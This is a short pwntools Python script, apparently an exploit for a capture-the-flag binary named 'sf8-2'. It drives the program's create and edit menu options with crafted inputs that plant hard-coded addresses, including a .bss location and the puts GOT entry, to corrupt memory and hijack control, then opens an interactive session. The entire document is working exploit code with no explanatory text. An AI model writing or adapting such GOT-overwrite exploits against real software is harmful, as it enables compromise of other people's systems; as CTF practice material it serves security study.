from pwn import*
p = process('./sf8-2')

# gadget
t = 0.2
bss = 0x6020a0 + 0x100
puts_got = 0x602028
# definition
def create(name,kind,age):
        p.sendline('1');sleep(t)
        p.sendlineafter('> ',name);sleep(t)
        p.sendlineafter('> ',kind);sleep(t)
        p.sendlineafter('> ',age);sleep(t)

def edit(index,name,kind,age):
        p.sendline('2');sleep(t)
        p.sendlineafter('> ',index);sleep(t)
        p.sendlineafter('> ',name);sleep(t)
        p.sendlineafter('> ',kind);sleep(t)
        p.sendlineafter('> ',age);sleep(t)





create('a'*8,'b'*8,'1')
edit('0','a','b','1')
p.sendline('n')
p.recv()

create('A'*8,p64(0x6020b0)+p64(0x6020a0+0x100),'2')

p.recv()
edit('0',p64(0x6020a0+0x100),p64(puts_got),'3')
p.sendline('y')


#p.sendline('y')
p.interactive()



























